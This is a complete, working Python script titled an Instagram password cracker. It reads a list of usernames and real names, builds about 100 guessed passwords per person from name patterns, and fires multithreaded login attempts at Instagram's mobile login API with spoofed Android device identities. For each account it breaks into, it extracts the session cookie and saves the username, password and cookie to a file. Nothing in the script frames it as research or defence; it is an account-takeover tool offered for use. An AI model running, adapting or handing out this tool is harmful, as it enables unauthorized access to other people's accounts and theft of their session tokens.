#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Instagram Password Cracker - Simple Version
Author: BITHIKA
Version: 3.0
"""
import hashlib
import uuid
import time
import urllib.parse
import random
import requests
import re
import json
import base64
import sys
import os
import threading
from concurrent.futures import ThreadPoolExecutor

# Color codes
G = "\033[1;92m"  # Green
R = "\033[1;91m"  # Red
Y = "\033[1;93m"  # Yellow
W = "\033[1;97m"  # White
C = "\033[1;96m"  # Cyan
M = "\033[1;95m"  # Magenta

# Global variables
loop = 0
oks = []
cps = []

# Thread-safe lock
counter_lock = threading.Lock()

def clear():
    """Clear terminal screen"""
    os.system('clear' if os.name == 'posix' else 'cls')

def logo():
    """Display logo"""
    print(f"""{G}
╔══════════════════════════════════════════╗
║     INSTAGRAM PASSWORD CRACKER           ║
║     Version 3.0 - Fixed & Optimized      ║
╚══════════════════════════════════════════╝{W}""")

def line():
    """Print line separator"""
    print(f"{C}{'═'*50}{W}")

def generate_passwords(username, name, patterns):
    """Generate passwords based on patterns"""
    passwords = []
    
    if name:
        # Split name
        name_parts = name.split()
        if len(name_parts) >= 2:
            fs = name_parts[0]  # First name
            ls = name_parts[-1] # Last name
        else:
            fs = name
            ls = name
        full_name = name
    else:
        fs = username
        ls = username
        full_name = username
    
    # Apply patterns
    for pattern in patterns:
        # Replace keywords in pattern
        pw = pattern.replace('first', fs.lower()).replace('First', fs)
        pw = pw.replace('last', ls.lower()).replace('Last', ls)
        pw = pw.replace('name', full_name.lower()).replace('Name', full_name)
        passwords.append(pw)
        
        # Add number variations
        for num in ['123', '1234', '12345', '@123', '!@#', '2024', '2023']:
            passwords.append(pw + num)
    
    # Add username variations
    passwords.extend([
        username,
        username + '123',
        username + '1234',
        username + '12345',
        username[:6],
        username[:8],
        fs.lower(),
        fs.lower() + '123',
        fs,
        fs + '123',
    ])
    
    # Remove duplicates
    unique_passwords = []
    seen = set()
    for pwd in passwords:
        if pwd and pwd not in seen:
            seen.add(pwd)
            unique_passwords.append(pwd)
    
    return unique_passwords[:100]  # Limit to 100 passwords

def crack(uid, name, patterns, total_users):
    """Crack Instagram account"""
    global loop, oks, cps
    
    # Generate passwords
    passwords = generate_passwords(uid, name, patterns)
    
    for pwd in passwords:
        with counter_lock:
            loop += 1
            progress = (loop / (total_users * len(passwords))) * 100 if total_users > 0 else 0
        
        # Show progress
        print(f"\r{Y}[*]{W} Testing: {C}{uid[:20]:20} {W}| Pass: {Y}{pwd[:15]:15} {W}| {G}{progress:.1f}%", end="", flush=True)
        
        try:
            # Create session
            session = requests.Session()
            
            # Generate device info
            device_id = f"android-{uuid.uuid4().hex[:16]}"
            family_id = str(uuid.uuid4())
            
            # Generate android ID
            md5 = hashlib.md5()
            md5.update(uid.encode() + pwd.encode())
            first = md5.hexdigest()
            md5.update(first.encode() + b'12345')
            android_id = md5.hexdigest()[:16]
            
            # User agent
            ua = 'Instagram 276.0.0.0.0 Android (28/9; 320dpi; 720x1280; samsung; SM-G973F; exynos9820; en_US; 351609250)'
            
            # Headers
            headers = {
                'User-Agent': ua,
                'Content-Type': 'application/x-www-form-urlencoded',
                'Accept': 'application/json',
                'Connection': 'keep-alive'
            }
            
            # Prepare data
            timestamp = int(time.time())
            enc_user = urllib.parse.quote(uid)
            enc_pass = urllib.parse.quote(pwd)
            enc_pwd = f'#PWD_INSTAGRAM:0:{timestamp}:{enc_pass}'
            
            # Login data
            data = {
                "device_id": f"android-{android_id}",
                "password": enc_pwd,
                "username": enc_user,
                "login_attempt_count": "0",
                "guid": str(uuid.uuid4()),
                "phone_id": str(uuid.uuid4()),
                "adid": str(uuid.uuid4()),
            }
            
            # Make request
            url = 'https://i.instagram.com/api/v1/accounts/login/'
            response = session.post(url, data=data, headers=headers, timeout=15)
            
            # Check response
            if 'logged_in_user' in response.text:
                print(f"\n{G}[+]{G} SUCCESS: {W}{uid} | {pwd}")
                
                # Try to extract cookies
                cookies = ""
                try:
                    if match := re.search(r'"sessionid":"([^"]+)"', response.text):
                        cookies = f"sessionid={match.group(1)}"
                except:
                    pass
                
                # Save success
                with open("/sdcard/success.txt", "a") as f:
                    f.write(f"{uid}|{pwd}|{cookies}\n")
                
                with counter_lock:
                    oks.append(uid)
                return True
                
            elif 'challenge_required' in response.text:
                with open("/sdcard/challenge.txt", "a") as f:
                    f.write(f"{uid}|{pwd}\n")
                with counter_lock:
                    cps.append(uid)
                continue
                
            elif 'checkpoint_required' in response.text:
                with open("/sdcard/checkpoint.txt", "a") as f:
                    f.write(f"{uid}|{pwd}\n")
                with counter_lock:
                    cps.append(uid)
                continue
                
        except requests.exceptions.Timeout:
            continue
        except requests.exceptions.ConnectionError:
            time.sleep(2)
            continue
        except Exception:
            continue
    
    return False

def main():
    """Main function"""
    global loop, oks, cps
    
    clear()
    logo()
    line()
    
    # Get file path
    print(f"{W}Enter file path (e.g., {C}/sdcard/users.txt{W})")
    print(f"{W}Format: {C}username|name{W} (one per line)")
    print(f"{Y}Example: {C}john_doe123|John Doe{W}")
    line()
    
    file_path = input(f"\n{G}[?]{W} File path: ").strip()
    
    if not os.path.exists(file_path):
        print(f"\n{R}[!]{R} File not found: {file_path}")
        time.sleep(2)
        return
    
    # Read file
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            users = [line.strip() for line in f if line.strip()]
    except:
        print(f"\n{R}[!]{R} Error reading file")
        time.sleep(2)
        return
    
    if not users:
        print(f"\n{R}[!]{R} File is empty")
        time.sleep(2)
        return
    
    print(f"\n{G}[+]{W} Loaded {len(users)} users")
    
    # Get password patterns
    print(f"\n{W}Enter password patterns (use keywords: first, First, last, Last, name, Name)")
    print(f"{Y}Example patterns: {C}firstlast, First123, name2024, firstname{W}")
    
    patterns = []
    try:
        pattern_count = int(input(f"\n{G}[?]{W} How many patterns? (1-10): "))
        pattern_count = max(1, min(10, pattern_count))
    except:
        pattern_count = 3
        print(f"{Y}[!]{W} Using default: 3 patterns")
    
    for i in range(pattern_count):
        pattern = input(f"{G}[?]{W} Pattern {i+1}: ").strip()
        if pattern:
            patterns.append(pattern)
    
    # If no patterns, use defaults
    if not patterns:
        patterns = ['firstlast', 'First123', 'name2024']
        print(f"{Y}[!]{W} Using default patterns: {', '.join(patterns)}")
    
    # Get thread count
    try:
        threads = int(input(f"\n{G}[?]{W} Threads (1-30): "))
        threads = max(1, min(30, threads))
    except:
        threads = 10
        print(f"{Y}[!]{W} Using default: 10 threads")
    
    # Reset counters
    loop = 0
    oks = []
    cps = []
    
    # Show summary
    line()
    print(f"\n{Y}[*]{Y} STARTING ATTACK")
    print(f"{W}Users: {len(users)}")
    print(f"Patterns: {', '.join(patterns)}")
    print(f"Threads: {threads}")
    print(f"Estimated passwords per user: ~100")
    line()
    
    input(f"\n{W}Press Enter to start...")
    
    start_time = time.time()
    
    # Process users
    try:
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = []
            
            for user_line in users:
                if '|' in user_line:
                    try:
                        uid, name = user_line.split('|', 1)
                        uid = uid.strip()
                        name = name.strip()
                    except:
                        uid = user_line.strip()
                        name = None
                else:
                    uid = user_line.strip()
                    name = None
                
                # Submit task
                future = executor.submit(crack, uid, name, patterns, len(users))
                futures.append(future)
            
            # Wait for completion
            for future in futures:
                try:
                    future.result()
                except Exception as e:
                    print(f"\n{R}[!]{R} Error: {e}")
                    
    except KeyboardInterrupt:
        print(f"\n\n{Y}[!]{Y} Stopped by user")
    
    # Show results
    end_time = time.time()
    total_time = end_time - start_time
    
    clear()
    logo()
    line()
    
    print(f"\n{G}[✓]{G} ATTACK COMPLETED")
    print(f"{C}{'─'*40}{W}")
    print(f"{W}Total users     : {len(users)}")
    print(f"{W}Total attempts  : {loop}")
    print(f"{G}Success         : {len(oks)}")
    print(f"{Y}Challenges      : {len(set(cps))}")
    print(f"{W}Time taken      : {total_time:.1f} seconds")
    print(f"{W}Speed           : {loop/total_time:.1f} attempts/sec")
    print(f"{C}{'─'*40}{W}")
    
    if oks:
        print(f"\n{G}[+]{G} SUCCESSFUL ACCOUNTS:")
        print(f"{Y}Saved to: /sdcard/success.txt")
        print(f"\n{W}First 5 accounts:")
        for i, uid in enumerate(oks[:5], 1):
            print(f"  {G}{i}.{W} {uid}")
    
    if cps:
        print(f"\n{Y}[!]{Y} Challenge accounts saved to:")
        print(f"{W}/sdcard/challenge.txt")
        print(f"{W}/sdcard/checkpoint.txt")
    
    print(f"\n{C}{'═'*50}{W}")
    input(f"\n{W}Press Enter to exit...")

if __name__ == "__main__":
    try:
        # Check requirements
        try:
            import requests
        except ImportError:
            print(f"{R}[!]{R} Install required module: pip install requests")
            sys.exit(1)
        
        main()
        
    except KeyboardInterrupt:
        print(f"\n{Y}[!]{Y} Program stopped")
        sys.exit(0)
    except Exception as e:
        print(f"\n{R}[!]{R} Error: {e}")
        sys.exit(1)
